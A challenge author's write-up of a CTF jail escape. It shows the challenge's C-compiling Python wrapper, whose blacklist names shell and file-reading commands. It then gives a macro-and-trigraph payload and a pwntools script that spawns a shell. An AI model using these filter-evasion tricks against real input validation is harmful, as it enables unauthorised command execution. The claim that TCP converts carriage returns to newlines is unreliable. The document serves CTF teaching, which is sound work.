---
title: "sctf/cjail revenge"
date: 2026-06-27
summary: "misc chall i wrote for sctf "
tags: ["dreamhack", "ctf", "misc"]
---

## Introduction  

During chall setting for SCTF , the misc category had a few empty slots, so I figured I'd set a few challs.  

A few people might know me as a Pyjail main, but the concept has been overdone in a lot of CTFs I've played, so I figured I'd switch things up this year.  

I came across [this challenge](https://dreamhack.io/wargame/challenges/2600) on Dreamhack, which served as the main inspiration for the cjail challs.  

For those confused about the challenge name, we lowkey forgot to add the original `cjail` challenge in quals :P  

## The Challenge   

<img src="/blog/sctf-cjail-revenge/images/cjail-revenge.png" width=600>

This chall involves a program that allows us to enter a single line of C code, which will be run through a series of validations, before being compiled and executed.  

```python
#!/usr/local/bin/python3.7

import subprocess
import os

payload = input('> ')

if not payload.isascii():
    print("only ascii allowed!")
    exit()

if not payload:
    print("payload cannot be empty!")
    exit()

if len(payload) > 200:
    print("payload too long!")
    exit()

bad_chars = '0123456789"\'#[]{};+-*/%&|:\\ \t'
bad_words = [
    'main',
    'int', 'char', 'bool', 'float', 'double', 'void', 'long', 'short', 'size',
    'std', 'exec', 'sys',
    'sh', 'cat', 'flag', 'xxd', 'head', 'tail'
]
banned = [*bad_chars, *bad_words]

for bad in banned:
    if bad in payload.lower():
        print("Blacklist:", bad)
        exit()

# compile and run
OUT = '/tmp/main'

if os.path.exists(OUT):
    os.remove(OUT)

try:
    subprocess.run(
        ['gcc', '-pipe', '-xc', '-std=c11', '-o', OUT, '-'],
        input=payload.encode(),
        capture_output=True,
        check=True
    )
except Exception as e:
    print("compilation error :(")
    exit()

subprocess.run([OUT])
```

`subprocess.run()` is called with the `capture_output` flag, so we can't outut the flag through an stderr leak like `#include "./flag.txt"`.  

This means that we need to pop a shell to read the flag. The most minimal way to do so is shown below.  

```c
#include <stdlib.h>

int main() {
    system("sh");
}
```

The first things we need to overcome are the blacklists. `bad_chars` restricts a lot of crucial symbols in C syntax, while `bad_words` is just a standard blacklist that blocks some essential C keywords.  

```python
bad_chars = '0123456789"\'#[]{};+-*/%&|:\\ \t'

bad_words = [
    'main',
    'int', 'char', 'bool', 'float', 'double', 'void', 'long', 'short', 'size',
    'std', 'exec', 'sys',
    'sh', 'cat', 'flag', 'xxd', 'head', 'tail'
]
```

The easiest thing to bypass now would be the quotes filter. We can define a macro function that uses the stringizing macro to build strings.  

```c
#define A(x) #x
#include <stdlib.h>

int main() {
    system(A(sh));
}
```

Next, we have to find a way to write the blacklisted keywords. We can do this using the concatenation macro.  

We define the entire `main()` function as a macro, then obfuscate restricted keywords using concatenation macros.  

```c
#define A(x) #x
#define L <st##dlib.h>
#include L
#define M i##nt ma##in(){sy##stem(A(s##h));}
M
```

Since `;` is blacklisted, we can simply shift the `system()` call into an `if` statement.  

```c
#define A(x) #x
#define L <st##dlib.h>
#include L
#define M i##nt ma##in(){if(sy##stem(A(s##h))){}}
M
```

The final thing we need to overcome is `#{}` being blocked, which normally prevents us from using macros and declaring code blocks.  

However, we will notice that our payload is compiled using the ISO C11 standard in GCC.  

```python
try:
    subprocess.run(
        ['gcc', '-pipe', '-xc', '-std=c11', '-o', OUT, '-'],
        input=payload.encode(),
        capture_output=True,
        check=True
    )
except Exception as e:
    print("compilation error :(")
    exit()
```

If we do a bit of digging, we will find that `C11` supports trigraphs as part of compilation syntax, which provides an alternative way of writing some symbols.  

Most importantly, there are corresponding trigraphs for `#{}`.  

<img src="/blog/sctf-cjail-revenge/images/trigraphs.png" width=800>

Rewriting our payload with trigraphs gives us a `139` character payload, which fits under the `200` length limit nicely.  

```c
??=define A(x) ??=x
??=define L <st??=??=dlib.h>
??=include L
??=define M i??=??=nt ma??=??=in()??<if(sy??=??=stem(A(s??=??=h)))??<??>??>
```

The final things we need to overcome are spaces being blocked and our payload having to fit under 1 line.  

We can easily overcome the space issue, as C syntax allows using alternative whitespace like `\v` to separate tokens.  

The 1 line issue is a bit harder to overcome, as omitting newlines from our payload violates C syntax rules and will prevent compilation.  

To overcome this, we can exploit a feature of TCP where carriage returns `\r` are converted to `\n`.  

Below is the full C payload, along with a simple Python script that handles the obfuscation and submission of the payload.  

```c
// payload.c

#define A(x) #x
#define L <st##dlib.h>
#include L
#define M i##nt ma##in(){if(sy##stem(A(s##h))){}}
M
```

```python
# solve.py

from pwn import *

io = remote("finals.sieberr.live", 23003)

def obf(s):
    tri = {
        '#': '??=',
        '[': '??(',
        ']': '??)',
        '{': '??<',
        '}': '??>'
    }
    
    for k, v in tri.items():
        s = s.replace(k, v)

    return s.replace(" ", '\v')

with open('payload.c', 'r') as f:
    payload = '\n'.join([l for l in f.read().split('\n') if l])

io.sendlineafter(b'>', obf(payload).replace('\n', '\r').encode())
io.interactive()
```

<img src="/blog/sctf-cjail-revenge/images/flag.png" width=800>

Flag: `sctf{cj4i15_4r3_4_5ubsEt_0f_pwN}`